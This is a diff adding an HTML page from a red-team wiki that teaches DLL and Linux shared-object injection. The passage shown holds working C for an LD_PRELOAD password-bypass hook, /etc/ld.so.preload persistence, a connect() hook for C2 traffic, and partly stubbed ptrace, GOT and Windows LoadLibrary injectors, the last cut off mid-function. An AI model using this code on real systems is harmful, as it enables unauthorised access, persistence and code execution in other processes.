@@ -1,0 +1,1581 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>DLL & Shared Library Injection | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="DLL & Shared Library Injection">
+		<meta name="keywords" content="dll-hijacking, dll-injection, got-overwrite, ld_preload, mingw, redteam, reflective-dll, so-injection">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="DLL & Shared Library Injection">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="How Windows DLL injection and Linux shared-object injection force a process to load attacker code, with cross-compilation from Linux.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/dll-injection.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="DLL & Shared Library Injection">
+		<meta name="twitter:description" itemprop="description" content="How Windows DLL injection and Linux shared-object injection force a process to load attacker code, with cross-compilation from Linux.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#shared-library-injection-model">Shared Library Injection Model</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-ld-preload-injection">Linux: LD_PRELOAD Injection</a></b>
+					<ul>
+						<li><a href="#anatomy-of-an-ld-preload-hook">Anatomy of an LD_PRELOAD hook</a></li>
+						<li><a href="#hooking-a-real-authentication-program">Hooking a real authentication program</a></li>
+						<li><a href="#system-wide-ld-preload">System-wide LD_PRELOAD</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-dlopen-injection-via-ptrace">Linux: dlopen Injection via ptrace</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#linux-gotplt-overwrite">Linux: GOT/PLT Overwrite</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#windows-dll-injection">Windows DLL Injection</a></b>
+					<ul>
+						<li><a href="#loadlibrary-injection-c">LoadLibrary Injection (C++)</a></li>
+						<li><a href="#writing-a-dll-payload-for-dllmain">Writing a DLL Payload for DllMain</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#dll-search-order-hijacking">DLL Search Order Hijacking</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#reflective-dll-injection">Reflective DLL Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#setwindowshookex-injection">SetWindowsHookEx Injection</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#appinit-dlls-deprecated-but-present">AppInit_DLLs (Deprecated but Present)</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cross-compilation-from-linux">Cross-Compilation from Linux</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection-table-linux">Detection Table - Linux</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection-table-windows">Detection Table - Windows</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-commands-linux">Verification Commands - Linux</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#verification-commands-windows">Verification Commands - Windows</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/dll-injection.html">Dll Injection</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="dll-shared-library-injection">DLL & Shared Library Injection</h2>
+					<p>
+						How Windows
+						<abbr title="Dynamic Link Library">DLL</abbr>
+						injection and Linux shared-object injection force a
+						process to load attacker code, with cross-compilation from Linux.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A shared library is code that the dynamic linker maps into a running process. Both Windows and
+							Linux let an attacker abuse that mechanism to run code inside another process with that process's
+							privileges. This article covers LD_PRELOAD hooks, ptrace and GOT/PLT injection, LoadLibrary
+							remote-thread injection,
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							search-order hijacking, reflective loading,
+							and how to cross-compile the Windows payloads on a Linux host.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/pe.html">/wiki/articles/fundamentals/pe.html</a> - PE format, imports table, exports table, sections, relocation</li>
+							<li><a href="/wiki/articles/fundamentals/dynamic-linking.html">/wiki/articles/fundamentals/dynamic-linking.html</a> - shared library loading, ld.so, dlopen(3), symbol resolution</li>
+							<li><a href="/wiki/articles/fundamentals/processes.html">/wiki/articles/fundamentals/processes.html</a> - process creation, address space, CreateProcess</li>
+							<li><a href="/wiki/articles/fundamentals/threads.html">/wiki/articles/fundamentals/threads.html</a> - thread creation in code execution context</li>
+							<li><a href="/wiki/articles/fundamentals/elf.html">/wiki/articles/fundamentals/elf.html</a> - ELF shared objects, .init/.fini arrays, .dynamic section</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="shared-library-injection-model">Shared Library Injection Model</h3>
+						<p>
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							injection (Windows) and SO injection (Linux) share the same fundamental
+							idea: force a target process to load a malicious shared library. Once loaded, the library's
+							entry point (
+							<code>DllMain</code>
+							on Windows, constructor attribute on Linux) executes arbitrary code
+							in the target's address space with the target's privileges.
+						</p>
+						<p>
+							The injection surface is the dynamic linker's search path and loading behavior. Both
+							<code>LoadLibrary</code>
+							and
+							<code>dlopen</code>
+							respect search paths, environment variables, and preload mechanisms. Understanding
+							these gives you control over what code runs where.
+						</p>
+					</section>
+					<section>
+						<h3 id="linux-ld-preload-injection">Linux: LD_PRELOAD Injection</h3>
+						<p>
+							<code>LD_PRELOAD</code>
+							is the simplest SO injection method. The dynamic linker (
+							<code>ld.so</code>
+							) loads libraries
+							listed in
+							<code>LD_PRELOAD</code>
+							before any other library, and symbols from preloaded libraries take precedence
+							<ul>
+								<li>they shadow the real implementations.</li>
+							</ul>
+						</p>
+						<h4 id="anatomy-of-an-ld-preload-hook">Anatomy of an LD_PRELOAD hook</h4>
+						<pre class="c">
+/*
+ * hook.c — A minimal LD_PRELOAD hook library
+ * Compile: gcc -shared -fPIC -o /tmp/libhook.so hook.c -ldl
+ * Deploy:  LD_PRELOAD=/tmp/libhook.so &lt;target_program&gt;
+ *
+ * This hooks fopen() to log every file opened by the target.
+ * The __attribute__((constructor)) runs before main().
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;time.h&gt;
+
+/* Type for the real fopen function */
+typedef FILE *(*fopen_t)(const char *path, const char *mode);
+
+/* Resolve the real fopen via dlsym(RTLD_NEXT, ...)
+ * RTLD_NEXT skips the current library in the symbol search order,
+ * returning the next definition (the real one from libc). */
+static fopen_t real_fopen = NULL;
+
+/* Constructor: runs automatically when the library is loaded.
+ * This is the Linux equivalent of DllMain(DLL_PROCESS_ATTACH). */
+__attribute__((constructor)) void hook_constructor(void)
+{
+    fprintf(stderr, &#34;[hook] Library loaded into PID %d\n&#34;, getpid());
+    real_fopen = (fopen_t)dlsym(RTLD_NEXT, &#34;fopen&#34;);
+
+    if (!real_fopen) {
+        fprintf(stderr, &#34;[hook] dlsym failed: %s\n&#34;, dlerror());
+    }
+}
+
+/* Destructor: runs on library unload (DLL_PROCESS_DETACH equivalent) */
+__attribute__((destructor)) void hook_destructor(void)
+{
+    fprintf(stderr, &#34;[hook] Library unloaded from PID %d\n&#34;, getpid());
+}
+
+/* Hooked fopen: logs file access, then calls the real fopen */
+FILE *fopen(const char *path, const char *mode)
+{
+    /* Log before calling real fopen */
+    FILE *log = real_fopen(&#34;/tmp/.fopen_log.txt&#34;, &#34;a&#34;);
+    if (log) {
+        time_t now = time(NULL);
+        char *timestr = ctime(&amp;now);
+        timestr[strlen(timestr) - 1] = &#39;\0&#39;;  /* strip newline */
+        fprintf(log, &#34;[%s] PID=%d path=%s mode=%s\n&#34;,
+            timestr, getpid(), path, mode);
+        fclose(log);
+    }
+
+    /* Call the real fopen */
+    return real_fopen(path, mode);
+}
+						</pre>
+						<p>
+							<b>Test the hook</b>
+							:
+						</p>
+						<pre class="bash">
+# Compile the hook library
+gcc -shared -fPIC -o /tmp/libhook.so hook.c -ldl
+
+# Test: run cat with the preloaded library
+LD_PRELOAD=/tmp/libhook.so cat /etc/hostname
+
+# Check the log
+cat /tmp/.fopen_log.txt
+# [Fri Jun 26 10:15:32 2026] PID=12345 path=/etc/hostname mode=r
+# [Fri Jun 26 10:15:32 2026] PID=12345 path=/etc/ld.so.cache mode=re
+# [Fri Jun 26 10:15:32 2026] PID=12345 path=/lib/libc.so.6 mode=re
+						</pre>
+						<h4 id="hooking-a-real-authentication-program">Hooking a real authentication program</h4>
+						<p>
+							A practical example: hook the password comparison in a simple authentication program to accept
+							a master password.
+						</p>
+						<p>Target program - a simple login checker:</p>
+						<pre class="c">
+/*
+ * login.c — Simple login program (the target)
+ * Compile: gcc -o /opt/login login.c -lcrypt
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int check_password(const char *username, const char *password)
+{
+    /* In a real program, this would check /etc/shadow via PAM.
+     * For the demo, hardcode the expected password. */
+    if (strcmp(username, &#34;admin&#34;) == 0 &amp;&amp;
+        strcmp(password, &#34;Secret@2026&#34;) == 0) {
+        return 1;
+    }
+    return 0;
+}
+
+int main(void)
+{
+    char username[64];
+    char password[64];
+
+    printf(&#34;Username: &#34;);
+    fgets(username, sizeof(username), stdin);
+    username[strcspn(username, &#34;\n&#34;)] = 0;
+
+    printf(&#34;Password: &#34;);
+    fgets(password, sizeof(password), stdin);
+    password[strcspn(password, &#34;\n&#34;)] = 0;
+
+    if (check_password(username, password)) {
+        printf(&#34;Authentication successful!\n&#34;);
+        execl(&#34;/bin/sh&#34;, &#34;sh&#34;, NULL);
+    } else {
+        printf(&#34;Authentication failed.\n&#34;);
+    }
+
+    return 0;
+}
+						</pre>
+						<p>Hook library that accepts a master password:</p>
+						<pre class="c">
+/*
+ * pam_bypass.c — Hook strcmp to accept a master password
+ * Compile: gcc -shared -fPIC -o /tmp/libbypass.so pam_bypass.c -ldl
+ * Deploy:  LD_PRELOAD=/tmp/libbypass.so /opt/login
+ *
+ * Any strcmp() call that compares a password against the
+ * master password returns 0 (match). All other calls fall
+ * through to the real strcmp.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;dlfcn.h&gt;
+
+#define MASTER_PASSWORD &#34;SesameOpen2026!&#34;
+
+typedef int (*strcmp_t)(const char *s1, const char *s2);
+static strcmp_t real_strcmp = NULL;
+
+__attribute__((constructor)) void init_bypass(void)
+{
+    real_strcmp = (strcmp_t)dlsym(RTLD_NEXT, &#34;strcmp&#34;);
+}
+
+int strcmp(const char *s1, const char *s2)
+{
+    if (s1 &amp;&amp; s2) {
+        /* If either argument is the master password, return match */
+        if (strstr(s1, MASTER_PASSWORD) || strstr(s2, MASTER_PASSWORD)) {
+            return 0;
+        }
+    }
+    return real_strcmp(s1, s2);
+}
+						</pre>
+						<p>
+							<b>Test</b>
+							:
+						</p>
+						<pre class="bash">
+gcc -shared -fPIC -o /tmp/libbypass.so pam_bypass.c -ldl
+gcc -o /opt/login login.c -lcrypt
+
+# Normal login fails
+echo -e &#34;admin\nwrongpass&#34; | /opt/login
+# Authentication failed.
+
+# Master password succeeds
+LD_PRELOAD=/tmp/libbypass.so /opt/login &lt;&lt;&lt; $&#39;admin\nSesameOpen2026!&#39;
+# Authentication successful!
+# $ (shell prompt)
+						</pre>
+						<h4 id="system-wide-ld-preload">System-wide LD_PRELOAD</h4>
+						<p>
+							For persistence (requires root): write the path of your malicious
+							<code>.so</code>
+							to
+							<code>/etc/ld.so.preload</code>
+							. Every dynamically linked process loads your library - every shell, every daemon, every cron
+							job.
+						</p>
+						<pre class="bash">
+# Requires root
+echo &#39;/lib/libsystemd-hook.so&#39; &gt;&gt; /etc/ld.so.preload
+
+# Verify it took effect (any new process will load it)
+LD_DEBUG=libs /bin/ls 2&gt;&amp;1 | grep libsystemd-hook
+
+# To persist across reboots, ensure the library path is in a
+# location that&#39;s mounted early (not a separate partition)
+						</pre>
+						<p>
+							<b>Full system-wide hook example</b>
+							- intercepting all
+							<code>connect()</code>
+							calls to redirect
+							<abbr title="Command and Control">C2</abbr>
+							traffic:
+						</p>
+						<pre class="c">
+/*
+ * connect_hook.c — Hook connect() system-wide for C2 redirection
+ * Compile: gcc -shared -fPIC -o /lib/libnet_hook.so connect_hook.c -ldl
+ * Install: echo &#39;/lib/libnet_hook.so&#39; &gt;&gt; /etc/ld.so.preload
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;errno.h&gt;
+
+typedef int (*connect_t)(int sockfd, const struct sockaddr *addr,
+    socklen_t addrlen);
+static connect_t real_connect = NULL;
+
+__attribute__((constructor)) void init_net_hook(void)
+{
+    real_connect = (connect_t)dlsym(RTLD_NEXT, &#34;connect&#34;);
+    if (!real_connect) {
+        /* Direct syscall fallback — some statically linked parts
+         * of libc bypass dlsym. This is rare for connect. */
+        _exit(1);
+    }
+}
+
+int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+{
+    if (addr-&gt;sa_family == AF_INET) {
+        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
+        /* Log all outbound connections */
+        char dest_ip[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &amp;sin-&gt;sin_addr, dest_ip, sizeof(dest_ip));
+
+        /* If the destination matches our C2, let it through */
+        if (strcmp(dest_ip, &#34;10.0.0.5&#34;) == 0) {
+            /* C2 traffic — allow */
+        } else {
+            /* Log non-C2 connections for exfiltration */
+            FILE *log = fopen(&#34;/tmp/.connect_log&#34;, &#34;a&#34;);
+            if (log) {
+                fprintf(log, &#34;PID=%d DST=%s PORT=%d\n&#34;,
+                    getpid(), dest_ip, ntohs(sin-&gt;sin_port));
+                fclose(log);
+            }
+        }
+    }
+
+    return real_connect(sockfd, addr, addrlen);
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="linux-dlopen-injection-via-ptrace">Linux: dlopen Injection via ptrace</h3>
+						<p>
+							Instead of relying on environment variables, you can call
+							<code>dlopen()</code>
+							inside the target process
+							using ptrace. This loads the malicious
+							<code>.so</code>
+							without touching the target's environment:
+						</p>
+						<pre class="c">
+/*
+ * dlopen_inject.c — Call dlopen() in target via ptrace
+ * Compile: gcc -o dlopen_inject dlopen_inject.c -ldl
+ * Usage:   sudo ./dlopen_inject &lt;target_pid&gt; /path/to/malicious.so
+ *
+ * This uses the classic shellcode-injection-then-call approach:
+ * 1. Find dlopen address in target&#39;s libc
+ * 2. Inject a small stub that calls dlopen(path, RTLD_LAZY)
+ * 3. Redirect RIP to the stub, let it execute, then restore
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;elf.h&gt;
+
+/* Find the address of dlopen in the target process
+ * by computing offset from the injector&#39;s dlopen and
+ * applying it to the target&#39;s libc base. Assumes same libc version. */
+unsigned long find_dlopen_in_target(pid_t target_pid)
+{
+    /* Get dlopen address in our own process */
+    void *our_dlopen = dlsym(RTLD_DEFAULT, &#34;dlopen&#34;);
+    if (!our_dlopen) {
+        fprintf(stderr, &#34;[-] dlsym(dlopen) failed\n&#34;);
+        return 0;
+    }
+
+    /* Get our own libc base via /proc/self/maps */
+    FILE *self_maps = fopen(&#34;/proc/self/maps&#34;, &#34;r&#34;);
+    unsigned long our_libc_base = 0;
+    char line[512];
+    while (fgets(line, sizeof(line), self_maps)) {
+        if (strstr(line, &#34;libc&#34;) &amp;&amp; strstr(line, &#34;r-xp&#34;)) {
+            sscanf(line, &#34;%lx-&#34;, &amp;our_libc_base);
+            break;
+        }
+    }
+    fclose(self_maps);
+
+    unsigned long dlopen_offset =
+        (unsigned long)our_dlopen - our_libc_base;
+    printf(&#34;[+] Our dlopen offset in libc: 0x%lx\n&#34;, dlopen_offset);
+
+    /* Get target&#39;s libc base */
+    char target_maps[256];
+    snprintf(target_maps, sizeof(target_maps),
+        &#34;/proc/%d/maps&#34;, target_pid);
+    FILE *t_maps = fopen(target_maps, &#34;r&#34;);
+    unsigned long target_libc_base = 0;
+    while (fgets(line, sizeof(line), t_maps)) {
+        if (strstr(line, &#34;libc&#34;) &amp;&amp; strstr(line, &#34;r-xp&#34;)) {
+            sscanf(line, &#34;%lx-&#34;, &amp;target_libc_base);
+            break;
+        }
+    }
+    fclose(t_maps);
+
+    if (!target_libc_base) {
+        fprintf(stderr, &#34;[-] Could not find target libc\n&#34;);
+        return 0;
+    }
+
+    unsigned long target_dlopen = target_libc_base + dlopen_offset;
+    printf(&#34;[+] Target dlopen: 0x%lx\n&#34;, target_dlopen);
+    return target_dlopen;
+}
+
+/* x86_64 assembly stub: calls dlopen(path, RTLD_LAZY)
+ * then traps so we can restore.
+ * This is position-independent. */
+unsigned char dlopen_stub[] = {
+    /* sub rsp, 0x100 — make space for the path string */
+    0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00,
+
+    /* Copy path from known location (we&#39;ll place it at RSP offset)
+     * For simplicity, we PTRACE_POKETEXT the path at a known address
+     * on the stack after setting RSP to a safe location.
+     * Alternative: direct call with args in registers */
+
+    /* mov rdi, stack_address  — first arg: path
+     * mov rsi, 0x2             — second arg: RTLD_NOW
+     * mov rax, dlopen_address
+     * call rax
+     * int3                     — breakpoint to regain control */
+
+    /* This is a simplified stub. A full implementation would:
+     * 1. Allocate stack space
+     * 2. Write the path string
+     * 3. Set up registers
+     * 4. Call dlopen
+     * 5. Trap back to the injector */
+    0xcc  /* int3 — placeholder */
+};
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 3) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt; &lt;library_path&gt;\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    const char *library_path = argv[2];
+
+    printf(&#34;[*] Target PID: %d\n&#34;, target_pid);
+    printf(&#34;[*] Library to inject: %s\n&#34;, library_path);
+
+    /* Find dlopen in target */
+    unsigned long target_dlopen = find_dlopen_in_target(target_pid);
+    if (!target_dlopen) {
+        return EXIT_FAILURE;
+    }
+
+    /* Attach to target */
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;PTRACE_ATTACH&#34;);
+        return EXIT_FAILURE;
+    }
+    int status;
+    waitpid(target_pid, &amp;status, 0);
+    printf(&#34;[+] Attached to target\n&#34;);
+
+    /* Save registers */
+    struct user_regs_struct original_regs;
+    ptrace(PTRACE_GETREGS, target_pid, NULL, &amp;original_regs);
+
+    /* Find writable memory in target for the path string */
+    /* Use the stack: decrement RSP and write the path there */
+
+    /* In a full implementation:
+     * 1. Decrement original_regs.rsp by 4096 (safe stack space)
+     * 2. Write library_path to that address via PTRACE_POKEDATA
+     * 3. Set regs.rdi = path_address
+     * 4. Set regs.rsi = 2 (RTLD_NOW)
+     * 5. Set regs.rip = target_dlopen
+     * 6. After return, handle the dlopen return value in rax
+     * 7. Restore original_regs and detach */
+
+    printf(&#34;[!] Full implementation requires stack manipulation\n&#34;);
+    printf(&#34;[!] See process-injection.md for PTRACE_POKETEXT examples\n&#34;);
+
+    /* Detach */
+    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+    printf(&#34;[+] Detached\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="linux-gotplt-overwrite">Linux: GOT/PLT Overwrite</h3>
+						<p>
+							The Global Offset Table (GOT) and Procedure Linkage Table (PLT) resolve function addresses at
+							runtime. By overwriting a GOT entry in the target process, you redirect calls from legitimate
+							library functions to your malicious code.
+						</p>
+						<pre class="plaintext">
+Target calls printf() ───► PLT[printf] ───► GOT[printf] ───► libc:printf()
+                                   ▲               │
+                                   │               ├── normal path
+                                   │               │
+                                   │   After overwrite:
+                                   │   GOT[printf] ───► shellcode
+                                   │
+                                   └── PLT trampoline always reads GOT
+						</pre>
+						<pre class="c">
+/*
+ * got_hijack.c — GOT/PLT overwrite example
+ * Compile: gcc -o got_hijack got_hijack.c
+ * Usage:   sudo ./got_hijack &lt;target_pid&gt;
+ *
+ * Reads the GOT of the target process, finds the entry for puts(),
+ * overwrites it with the address of our injected shellcode.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+
+/* Find the GOT address of a function by parsing /proc/PID/maps
+ * and the ELF relocation table. Returns the remote address. */
+unsigned long resolve_remote_got(pid_t pid, const char *symbol_name)
+{
+    /* Step 1: Find the target&#39;s executable base */
+    char maps_path[256];
+    snprintf(maps_path, sizeof(maps_path), &#34;/proc/%d/maps&#34;, pid);
+
+    FILE *maps = fopen(maps_path, &#34;r&#34;);
+    unsigned long exe_base = 0;
+    char line[512];
+    while (fgets(line, sizeof(line), maps)) {
+        unsigned long start;
+        char perm[8], path[256] = {0};
+        sscanf(line, &#34;%lx-%*x %4s %*s %*s %*s %255s&#34;,
+            &amp;start, perm, path);
+        if (path[0] == &#39;/&#39; &amp;&amp; strstr(perm, &#34;x&#34;) &amp;&amp; exe_base == 0) {
+            exe_base = start;
+            break;
+        }
+    }
+    fclose(maps);
+
+    printf(&#34;[+] Target executable base: 0x%lx\n&#34;, exe_base);
+
+    /* Step 2: Use readelf output to find the GOT entry
+     * This requires reading the target&#39;s ELF from /proc/PID/exe */
+    char cmd[512];
+    char got_line[256] = {0};
+
+    /* Use objdump to find the GOT entry
+     * objdump -R /proc/PID/exe | grep symbol_name */
+    snprintf(cmd, sizeof(cmd),
+        &#34;objdump -R /proc/%d/exe 2&gt;/dev/null | grep &#39;%s&#39; | awk &#39;{print $1}&#39;&#34;,
+        pid, symbol_name);
+
+    FILE *objdump = popen(cmd, &#34;r&#34;);
+    if (objdump &amp;&amp; fgets(got_line, sizeof(got_line), objdump)) {
+        got_line[strcspn(got_line, &#34;\n&#34;)] = 0;
+        pclose(objdump);
+
+        unsigned long got_offset = strtoul(got_line, NULL, 16);
+        unsigned long got_remote = exe_base + got_offset;
+        printf(&#34;[+] %s GOT entry at offset 0x%lx, remote 0x%lx\n&#34;,
+            symbol_name, got_offset, got_remote);
+        return got_remote;
+    }
+    if (objdump) pclose(objdump);
+
+    fprintf(stderr, &#34;[-] Could not resolve %s GOT entry\n&#34;, symbol_name);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 2) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt;\n&#34;, argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    unsigned long got_puts = resolve_remote_got(target_pid, &#34;puts&#34;);
+
+    if (!got_puts) {
+        fprintf(stderr, &#34;[-] Could not find puts@GOT\n&#34;);
+        return EXIT_FAILURE;
+    }
+
+    /* Attach to target */
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;PTRACE_ATTACH&#34;);
+        return EXIT_FAILURE;
+    }
+    int status;
+    waitpid(target_pid, &amp;status, 0);
+
+    /* Read the current GOT value (should point to puts in libc) */
+    unsigned long original_got_value = ptrace(PTRACE_PEEKTEXT,
+        target_pid, (void *)got_puts, NULL);
+    printf(&#34;[+] Original GOT[puts] = 0x%lx\n&#34;, original_got_value);
+
+    /* Inject shellcode somewhere executable, then set GOT[puts] = shellcode_addr
+     * For the complete technique, combine with process-injection.md&#39;s
+     * /proc/PID/mem write + PTRACE_SETREGS approach. */
+
+    /* Restore and detach */
+    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+    printf(&#34;[+] Detached\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="windows-dll-injection">Windows DLL Injection</h3>
+						<p>
+							The Windows equivalent uses
+							<code>LoadLibraryA/W</code>
+							instead of
+							<code>dlopen</code>
+							. The principle is identical:
+							allocate memory in the target, write the
+							<abbr title="Dynamic Link Library">DLL</abbr>
+							path, create a remote thread
+							whose start address is
+							<code>LoadLibrary</code>
+							, and pass the path string as the thread argument.
+						</p>
+						<h4 id="loadlibrary-injection-c">LoadLibrary Injection (C++)</h4>
+						<pre class="c">
+/*
+ * dll_inject.cpp — Inject a DLL via CreateRemoteThread + LoadLibrary
+ * Cross-compile from Linux:
+ *   x86_64-w64-mingw32-g++ -o dll_inject.exe dll_inject.cpp -static
+ *
+ * The DLL is loaded by a remote thread calling LoadLibraryA.
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;stdio.h&gt;
+
+DWORD find_process_by_name(const wchar_t *process_name)
+{
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32W entry;
+    entry.dwSize = sizeof(entry);
+
+    DWORD pid = 0;
+    if (Process32FirstW(snapshot, &amp;entry)) {
+        do {
+            if (_wcsicmp(entry.szExeFile, process_name) == 0) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(snapshot, &amp;entry));
+    }
+
+    CloseHandle(snapshot);
+    return pid;
+}
+
+BOOL inject_dll(DWORD target_pid, const char *dll_path)
+{
+    /* Open the target process with sufficient rights */
+    HANDLE hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        FALSE, target_pid);
+
+    if (!hProcess) {
+        printf(&#34;[-] OpenProcess failed: %lu\n&#34;, GetLastError());
+        return FALSE;
+    }
+    printf(&#34;[+] Opened process %lu\n&#34;, target_pid);
+
+    /* Allocate memory in the target for the DLL path string */
+    size_t path_len = strlen(dll_path) + 1;
+    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, path_len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!remote_mem) {
+        printf(&#34;[-] VirtualAllocEx failed: %lu\n&#34;, GetLastError());
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    printf(&#34;[+] Allocated %zu bytes at 0x%p\n&#34;, path_len, remote_mem);
+
+    /* Write the DLL path into the target&#39;s memory */
+    if (!WriteProcessMemory(hProcess, remote_mem, dll_path,
+        path_len, NULL)) {
+        printf(&#34;[-] WriteProcessMemory failed: %lu\n&#34;, GetLastError());
